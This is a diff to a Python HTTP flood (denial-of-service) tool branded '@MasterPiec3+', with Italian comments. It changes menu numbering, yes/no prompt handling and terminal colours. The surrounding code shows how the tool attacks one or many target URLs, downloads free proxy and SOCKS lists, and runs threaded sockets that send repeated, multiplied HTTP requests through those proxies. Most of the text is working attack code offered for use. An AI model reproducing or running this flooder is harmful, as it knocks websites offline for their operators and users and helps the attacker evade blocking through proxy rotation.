@@ -464,9 +464,9 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 	global choice1
 	global ips
 
-	choice1 = input("\n \033[96m@MasterPiec3+>\033[93m ATTACK ONE TARGET ? [1] OR MORE ? [2]: \033[39m")
+	choice1 = input("\n \033[96m@MasterPiec3+>\033[93m ATTACK ONE TARGET ? [0] OR MORE ? [1]: \033[39m")
 
-	if choice1 == "2":
+	if choice1 == "1":
 		ip_file = input(" \033[96m@MasterPiec3+>\033[93m ENTER THE NAME OF TEXT FILE CONTAINING URL ADRESSES: \033[39m")
 		ips = open(ip_file).readlines()
 
@@ -503,47 +503,38 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 def proxymode():
 	global choice2
-	choice2 = input(" \033[96m@MasterPiec3+>\033[93m ENABLE PROXYS/SOCKS MODE ? [YES] OR [NO]: \033[39m")
-	if choice2 == "y" or choice2 == "Y" or choice2 == "yes" or choice2 == "YES":
+	choice2 = input(" \033[96m@MasterPiec3+>\033[93m ENABLE PROXYS/SOCKS MODE ? [y] OR [n]: \033[39m")
+	if choice2 == "y":
 		choiceproxysocks()
-	if choice2 == "n" or choice2 == "N" or choice2 == "no" or choice2 == "NO":
-		numthreads()
 	else:
-		print (" \033[96m@MasterPiec3+>\033[31m YOU MISSTYPED, PLEASE TRY AGAIN\033[39m")
-		proxymode()
+		numthreads()
 
 def choiceproxysocks():
 	global choice3
-	choice3 = input(" \033[96m@MasterPiec3+>\033[93m ENABLE PROXY MODE [1] - ENABLE SOCKS MODE [2]: \033[39m")
-	if choice3 == "1":
+	choice3 = input(" \033[96m@MasterPiec3+>\033[93m ENABLE PROXY MODE [0] - ENABLE SOCKS MODE [1]: \033[39m")
+	if choice3 == "0":
 		choicedownproxy()
-	elif choice3 == "2":
+	elif choice3 == "1":
 		choicedownsocks()
 	else:
 		print (" \033[96m@MasterPiec3+>\033[31m YOU MISSTYPED, PLEASE TRY AGAIN\033[39m")
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input(" \033[96m@MasterPiec3+>\033[93m DOWNLOAD NEW LIST OF PROXYS ? [YES] OR [NO]: \033[39m")
-	if choice4 == "y" or choice2 == "Y" or choice2 == "yes" or choice2 == "YES":
+	choice4 = input(" \033[96m@MasterPiec3+>\033[93m DOWNLOAD NEW LIST OF PROXYS ? [y] OR [n]: \033[39m")
+	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
-	if choice4 == "n" or choice2 == "N" or choice2 == "no" or choice2 == "NO":
-		proxylist()
 	else:
-		print (" \033[96m@MasterPiec3+>\033[31m YOU MISSTYPED, PLEASE TRY AGAIN\033[39m")
-		choicedownproxy()
+		proxylist()
 
 def choicedownsocks():
-	choice4 = input(" \033[96m@MasterPiec3+>\033[93m DOWNLOAD NEW LIST OF SOCKS ? [YES] OR [NO]: \033[39m")
-	if choice4 == "y" or choice2 == "Y" or choice2 == "yes" or choice2 == "YES":
+	choice4 = input(" \033[96m@MasterPiec3+>\033[93m DOWNLOAD NEW LIST OF SOCKS ? [y] OR [n]: \033[39m")
+	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
-		proxyget(urlproxy)
-	if choice4 == "n" or choice2 == "N" or choice2 == "no" or choice2 == "NO":
-		proxylist()
+		proxyget(urlproxy)		
 	else:
-		print (" \033[96m@MasterPiec3+>\033[31m YOU MISSTYPED, PLEASE TRY AGAIN\033[39m")
-		choicedownsocks()
+		proxylist()
 
 def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 	try:
@@ -638,17 +629,17 @@ def loop():
 		if choice3 == "0": # e abbiamo scelto gli HTTP proxy
 			for x in range(threads):
 				RequestProxyHTTP(x+1).start() # starta la classe apposita
-				print (" \033[96m@MasterPiec3+>\033[1;32m THREAD " + str(x) + " READY!\033[39m")
+				print (" \033[96m@MasterPiec3+>\033[1;32m THREAD " + str(x) + " READY!\033[31m")
 			go.set() # questo fa avviare i threads appena sono tutti pronti
 		else: # se abbiamo scelto i socks
 			for x in range(threads):
 				RequestSocksHTTP(x+1).start() # starta la classe apposita
-				print (" \033[96m@MasterPiec3+>\033[1;32m THREAD " + str(x) + " READY!\033[39m")
+				print (" \033[96m@MasterPiec3+>\033[1;32m THREAD " + str(x) + " READY!\033[31m")
 			go.set() # questo fa avviare i threads appena sono tutti pronti
 	else: # altrimenti manda richieste normali non proxate.
 		for x in range(threads):
 			RequestDefaultHTTP(x+1).start() # starta la classe apposita
-			print (" \033[96m@MasterPiec3+>\033[1;32m THREAD " + str(x) + " READY!\033[39m")
+			print (" \033[96m@MasterPiec3+>\033[1;32m THREAD " + str(x) + " READY!\033[31m")
 		go.set() # questo fa avviare i threads appena sono tutti pronti
 
 
@@ -680,7 +671,7 @@ class RequestProxyHTTP(threading.Thread): # la classe del multithreading
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
 				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
 				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM " + str(proxy[0]+":"+proxy[1]) + " @\033[39m", self.counter) # print delle richieste
+				print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM " + str(proxy[0]+":"+proxy[1]) + " @\033[31m", self.counter) # print delle richieste
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
@@ -716,7 +707,7 @@ class RequestSocksHTTP(threading.Thread): # la classe del multithreading
 				s = socks.socksocket() # creazione socket con pysocks
 				s.connect((str(url2), int(urlport))) # connessione
 				s.send (str.encode(request)) # invio
-				print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM " + str(proxy[0]+":"+proxy[1]) + " @\033[39m", self.counter) # print req + counter
+				print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM " + str(proxy[0]+":"+proxy[1]) + " @\033[31m", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
@@ -729,14 +720,14 @@ class RequestSocksHTTP(threading.Thread): # la classe del multithreading
 					s = socks.socksocket() # creazione nuovo socket
 					s.connect((str(url2), int(urlport))) # connessione
 					s.send (str.encode(request)) # invio
-					print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM " + str(proxy[0]+":"+proxy[1]) + " @\033[39m", self.counter) # print req + counter
+					print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM " + str(proxy[0]+":"+proxy[1]) + " @\033[31m", self.counter) # print req + counter
 					try: # invia altre richieste nello stesso thread
 						for y in range(multiple): # fattore di moltiplicazione
 							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
 					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
 						s.close()
 				except:
-					print (" \033[96m@MasterPiec3+>\033[31m SOCK DOWN... RETRYING REQUEST... @\033[39m", self.counter)
+					print (" \033[96m@MasterPiec3+>\033[31m SOCK DOWN... RETRYING REQUEST... @\033[31m", self.counter)
 					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.
 
 class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
@@ -760,7 +751,7 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
 				s.connect((str(url2), int(urlport))) # connessione
 				s.send (str.encode(request)) # invio
-				print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM @\033[39m", self.counter) # print req + counter
+				print (" \033[96m@MasterPiec3+>\033[93m REQUEST SENT FROM @\033[31m", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
